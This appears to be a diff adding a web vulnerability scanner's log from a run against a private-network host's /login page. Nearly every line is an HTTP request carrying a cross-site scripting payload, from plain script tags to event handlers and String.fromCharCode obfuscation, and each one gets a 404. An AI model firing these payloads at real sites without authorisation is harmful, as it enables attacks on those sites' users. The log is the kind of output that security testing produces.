@@ -1,0 +1,786 @@
+2025-01-29 22:51:43,322 - INFO - [36mCrawling: http://172.20.10.3:80
+2025-01-29 22:51:43,533 - INFO - HTTP Request: GET http://172.20.10.3 "HTTP/1.1 200 OK"
+2025-01-29 22:51:43,534 - INFO - [36mCrawling: http://172.20.10.3:80/login
+2025-01-29 22:51:43,722 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:43,907 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:44,095 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert('XSS')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:44,095 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>alert('XSS')</script>: 404
+2025-01-29 22:51:44,285 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:44,474 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:44,474 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<img src="x" onerror="alert('XSS')">: 404
+2025-01-29 22:51:44,659 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:44,853 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:44,853 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:51:45,049 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:45,237 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:45,237 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:51:45,428 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:45,617 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cbody%20onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:45,617 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<body onload=alert('XSS')>: 404
+2025-01-29 22:51:45,804 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:45,996 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:45,996 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:51:46,180 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:46,368 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:46,368 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg><script>alert('XSS')</script></svg>: 404
+2025-01-29 22:51:46,557 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:46,749 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cmath%3E%3Cmtext%20onload="alert('XSS')"%3EXSS%3C/mtext%3E%3C/math%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:46,749 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<math><mtext onload="alert('XSS')">XSS</mtext></math>: 404
+2025-01-29 22:51:46,937 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:47,127 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg/onload=alert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:47,127 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg/onload=alert('XSS')>: 404
+2025-01-29 22:51:47,315 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:47,509 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:47,509 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:51:47,696 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:47,893 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cobject%20data="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:47,893 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<object data="javascript:alert('XSS')">: 404
+2025-01-29 22:51:48,079 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:48,268 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:48,268 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:51:48,458 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:48,651 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:48,651 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:51:48,840 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:49,029 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cdetails%20open%3E%3Csummary%20onclick="alert('XSS')"%3EXSS%3C/summary%3E%3C/details%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:49,029 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<details open><summary onclick="alert('XSS')">XSS</summary></details>: 404
+2025-01-29 22:51:49,217 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:49,408 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Carea%20shape="rect"%20coords="0,0,10,10"%20href="javascript:alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:49,409 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<area shape="rect" coords="0,0,10,10" href="javascript:alert('XSS')" />: 404
+2025-01-29 22:51:49,596 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:49,794 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert(document.cookie)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:49,794 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>alert(document.cookie)</script>: 404
+2025-01-29 22:51:49,981 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:50,171 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert(location)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:50,171 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>alert(location)</script>: 404
+2025-01-29 22:51:50,360 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:50,550 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert(1+1)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:50,551 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>alert(1+1)</script>: 404
+2025-01-29 22:51:50,743 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:50,936 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Eeval('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:50,937 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>eval('alert("XSS")')</script>: 404
+2025-01-29 22:51:51,125 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:51,310 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.write("%3Cimg%20src='x'%20onerror='alert(1)'%20/%3E")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:51,311 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.write("<img src='x' onerror='alert(1)' />")</script>: 404
+2025-01-29 22:51:51,499 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:51,694 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg/onload="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:51,695 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg/onload="alert('XSS')">: 404
+2025-01-29 22:51:51,893 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:52,080 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20Here%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:52,080 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<a href="javascript:alert('XSS')">Click Here</a>: 404
+2025-01-29 22:51:52,268 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:52,454 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cform%20action="javascript:alert('XSS')"%3E%3C/form%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:52,454 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<form action="javascript:alert('XSS')"></form>: 404
+2025-01-29 22:51:52,643 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:52,832 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:52,832 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:51:53,016 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:53,204 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:53,205 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:51:53,390 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:53,584 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:53,584 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:51:53,773 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:53,963 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Cimg%20src=x%20onerror=alert('XSS')%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:53,964 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.body.innerHTML = "<img src=x onerror=alert('XSS')>"</script>: 404
+2025-01-29 22:51:54,154 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:54,337 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.body.innerHTML%20=%20"%3Ca%20href=javascript:alert('XSS')%3Eclick%3C/a%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:54,337 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.body.innerHTML = "<a href=javascript:alert('XSS')>click</a>"</script>: 404
+2025-01-29 22:51:54,526 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:54,710 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.location="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:54,710 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.location="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:51:54,905 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:55,094 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ewindow.location.href="javascript:alert('XSS')"%20%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:55,094 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>window.location.href="javascript:alert('XSS')" </script>: 404
+2025-01-29 22:51:55,283 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:55,475 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Elocation.replace("javascript:alert('XSS')")%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:55,475 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>location.replace("javascript:alert('XSS')")</script>: 404
+2025-01-29 22:51:55,661 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:55,861 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.write('%3Cscript%3Ealert("XSS")%3C/script%3E');%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:55,862 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.write('<script>alert("XSS")</script>');</script>: 404
+2025-01-29 22:51:56,052 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:56,258 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ewindow.top.location='javascript:alert("XSS")';%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:56,258 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>window.top.location='javascript:alert("XSS")';</script>: 404
+2025-01-29 22:51:56,447 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:56,637 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src="x"%20onerror="alert('XSS')"%20/%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:56,637 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<img src="x" onerror="alert('XSS')" />: 404
+2025-01-29 22:51:56,827 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:57,020 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cvideo%3E%3Csource%20onerror="alert('XSS')"%20src="x"%3E%3C/video%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:57,020 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<video><source onerror="alert('XSS')" src="x"></video>: 404
+2025-01-29 22:51:57,217 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:57,417 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Caudio%20onerror="alert('XSS')"%3E%3C/audio%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:57,417 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<audio onerror="alert('XSS')"></audio>: 404
+2025-01-29 22:51:57,607 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:57,797 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cembed%20src="javascript:alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:57,797 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<embed src="javascript:alert('XSS')">: 404
+2025-01-29 22:51:57,990 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:58,179 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src="javascript:alert('XSS')"%3E%3C/iframe%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:58,179 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<iframe src="javascript:alert('XSS')"></iframe>: 404
+2025-01-29 22:51:58,371 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:58,561 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg/onload=alert(String.fromCharCode(88,83,83))%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:58,561 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg/onload=alert(String.fromCharCode(88,83,83))>: 404
+2025-01-29 22:51:58,749 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:58,943 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:58,944 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>alert(String.fromCharCode(88,83,83))</script>: 404
+2025-01-29 22:51:59,133 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:59,329 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:59,330 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:51:59,521 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:51:59,709 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C/script%3E%3C/svg%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:51:59,709 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>: 404
+2025-01-29 22:51:59,898 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:00,089 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:00,089 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:00,278 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:00,468 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:00,469 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:00,666 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:00,855 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:00,855 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E: 404
+2025-01-29 22:52:01,056 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:01,251 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:01,252 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:01,441 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:01,630 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Csvg%20onload%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:01,630 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Csvg%20onload%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:01,823 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:02,012 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:02,013 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Ciframe%20src%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:02,201 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:02,389 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:02,389 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E: 404
+2025-01-29 22:52:02,580 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:02,772 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Caudio%20onerror%3Dalert('XSS')%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:02,772 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Caudio%20onerror%3Dalert('XSS')%3E: 404
+2025-01-29 22:52:02,960 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:03,155 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:03,155 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=%3Cdetails%20open%3E%3Csummary%20onclick%3Dalert('XSS')%3EXSS%3C%2Fsummary%3E%3C%2Fdetails%3E: 404
+2025-01-29 22:52:03,345 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:03,535 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cinput%20onfocus="alert('XSS')"%20autofocus%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:03,536 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<input onfocus="alert('XSS')" autofocus>: 404
+2025-01-29 22:52:03,724 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:03,918 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cimg%20src="x"%20onerror="alert(1)"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:03,918 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<img src="x" onerror="alert(1)">: 404
+2025-01-29 22:52:04,105 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:04,291 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ca%20href="javascript:alert('XSS')"%3EClick%20me%3C/a%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:04,291 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<a href="javascript:alert('XSS')">Click me</a>: 404
+2025-01-29 22:52:04,478 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:04,667 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cbutton%20onclick="alert('XSS')"%3EClick%20me%3C/button%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:04,667 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<button onclick="alert('XSS')">Click me</button>: 404
+2025-01-29 22:52:04,868 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:05,061 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cinput%20type="button"%20value="Click%20me"%20onclick="alert('XSS')"%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:05,061 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<input type="button" value="Click me" onclick="alert('XSS')">: 404
+2025-01-29 22:52:05,252 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:05,445 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Ctextarea%20onfocus="alert('XSS')"%3ETest%3C/textarea%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:05,446 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<textarea onfocus="alert('XSS')">Test</textarea>: 404
+2025-01-29 22:52:05,636 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:05,834 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ewindow['eval']('alert("XSS")')%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:05,834 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>window['eval']('alert("XSS")')</script>: 404
+2025-01-29 22:52:06,028 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:06,221 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ewindow['setInterval']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:06,221 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>window['setInterval']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:52:06,410 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:06,601 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Ewindow['setTimeout']('alert("XSS")',%201000)%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:06,602 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>window['setTimeout']('alert("XSS")', 1000)</script>: 404
+2025-01-29 22:52:06,791 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:06,987 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20'%3Cimg%20src="x"%20onerror="alert(1)"%20/%3E'%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:06,987 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.getElementById('myElem').innerHTML = '<img src="x" onerror="alert(1)" />'</script>: 404
+2025-01-29 22:52:07,181 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
+2025-01-29 22:52:07,372 - INFO - HTTP Request: GET http://172.20.10.3/login&username=%3Cscript%3Edocument.getElementById('myElem').innerHTML%20=%20"%3Cscript%3Ealert('XSS')%3C/script%3E"%3C/script%3E "HTTP/1.1 404 NOT FOUND"
+2025-01-29 22:52:07,372 - WARNING - [33mNon-200 status code for http://172.20.10.3:80/login&username=<script>document.getElementById('myElem').innerHTML = "<script>alert('XSS')</script>"</script>: 404
+2025-01-29 22:52:07,566 - INFO - HTTP Request: GET http://172.20.10.3/login "HTTP/1.1 200 OK"
